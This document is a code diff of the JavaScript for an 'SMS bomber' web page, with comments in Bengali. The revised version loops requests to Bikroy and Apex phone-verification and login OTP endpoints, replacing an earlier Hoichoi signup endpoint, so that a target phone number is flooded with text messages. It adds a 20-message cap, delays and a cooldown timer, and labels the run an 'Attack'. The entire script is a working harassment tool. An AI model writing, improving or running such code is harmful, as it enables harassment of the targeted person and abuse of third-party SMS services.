@@ -1,6 +1,6 @@
-let isCooldown = false; 
+let isCooldown = false;
 
-// ১. পেজ লোড হওয়ার সময় আগের টাইমার চেক করা
+// পেজ লোড হওয়ার সময় চেক করবে কোনো আগের টাইমার বাকি আছে কি না
 window.onload = function() {
     const savedCooldownTime = localStorage.getItem('cooldownEndTime');
     if (savedCooldownTime) {
@@ -14,47 +14,58 @@ window.onload = function() {
 
 async function startProcess() {
     const target = document.getElementById('target').value;
-    const count = parseInt(document.getElementById('count').value);
+    const countInput = document.getElementById('count');
+    const count = parseInt(countInput.value);
     const display = document.getElementById('display');
 
-    if (isCooldown) { 
-        display.innerText = "Wait for cooldown!"; 
-        return; 
+    if (isCooldown) {
+        display.innerText = "Wait for cooldown to end!";
+        return;
     }
 
     if(!target || !count) { 
-        display.innerText = "Enter target & amount!"; 
+        display.innerText = "Enter number and amount!"; 
         return; 
     }
 
-    display.innerText = "Hoichoi Attack Started...";
+    if (count > 20) {
+        display.innerText = "Error: Maximum limit is 20!";
+        return;
+    }
+
+    display.innerText = "Attack Started...";
     
+    // Apex এবং Bikroy এপিআই লিস্ট
+    const apiList = [
+        { url: `https://bikroy.com/data/phone_number_verification/otp?phone=${target}`, method: 'GET' },
+        { url: 'https://api.apex4u.com/api/auth/login', method: 'POST', body: { "phoneNumber": target } }
+    ];
+
     for (let i = 1; i <= count; i++) {
         try { 
-            // Hoichoi POST API
-            // আপনার স্ক্রিনশট অনুযায়ী সঠিক পেলোড ফরম্যাট
-            await fetch('https://prod-api.hoichoi.dev/core/api/v1/auth/signup/code', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json' 
-                },
-                body: JSON.stringify({ 
-                    "phoneNumber": "+88" + target 
-                }),
-                mode: 'cors'
-            });
+            let currentApi = apiList[(i - 1) % apiList.length];
+            
+            // এপিআই মেথড অনুযায়ী রিকোয়েস্ট পাঠানো
+            if (currentApi.method === 'GET') {
+                await fetch(currentApi.url, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
+            } else {
+                await fetch(currentApi.url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(currentApi.body),
+                    mode: 'cors'
+                });
+            }
 
-            display.innerText = "SMS Sent: " + i;
-            
-            // ১০০% এসএমএস নিশ্চিত করতে ১০ সেকেন্ড বিরতি (সার্ভার ব্লক এড়াতে)
-            await new Promise(res => setTimeout(res, 10000)); 
-            
+            display.innerText = "Sent: " + i;
+            // ৪ সেকেন্ড বিরতি আপনার কোড অনুযায়ী
+            await new Promise(res => setTimeout(res, 4000));
         } catch (e) {
-            console.log("Error in attempt " + i);
+            console.log("Error skipped...");
         }
     }
 
-    // ২. কাজ শেষে ৬০ সেকেন্ডের টাইমার সেট করা
+    // কাজ শেষে ৬০ সেকেন্ডের কুলডাউন সেট করা
     const cooldownEndTime = Date.now() + 60000;
     localStorage.setItem('cooldownEndTime', cooldownEndTime);
     activateCooldown(60);
@@ -63,19 +74,21 @@ async function startProcess() {
 function activateCooldown(seconds) {
     isCooldown = true;
     let timeLeft = seconds;
+    
     const timer = setInterval(() => {
         timeLeft--;
         document.getElementById('display').innerText = `Wait: ${timeLeft}s`;
+        
         if (timeLeft <= 0) {
             clearInterval(timer);
             isCooldown = false;
-            localStorage.removeItem('cooldownEndTime');
-            document.getElementById('display').innerText = "Ready!";
+            localStorage.removeItem('cooldownEndTime'); 
+            document.getElementById('display').innerText = "Ready for Next Attack!";
         }
     }, 1000);
 }
 
-// ৩. ম্যাট্রিক্স ব্যাকগ্রাউন্ড অ্যানিমেশন (আপনার সাইটের স্টাইল)
+// Matrix Background Animation (অপরিবর্তিত)
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
@@ -88,7 +101,7 @@ const drops = Array(Math.floor(columns)).fill(1);
 function draw() {
     ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
     ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = "#ff0000"; // আপনি চাইলে সবুজ #00ff00 ও দিতে পারেন
+    ctx.fillStyle = "#00ff00";
     ctx.font = fontSize + "px monospace";
     for (let i = 0; i < drops.length; i++) {
         const text = letters[Math.floor(Math.random() * letters.length)];
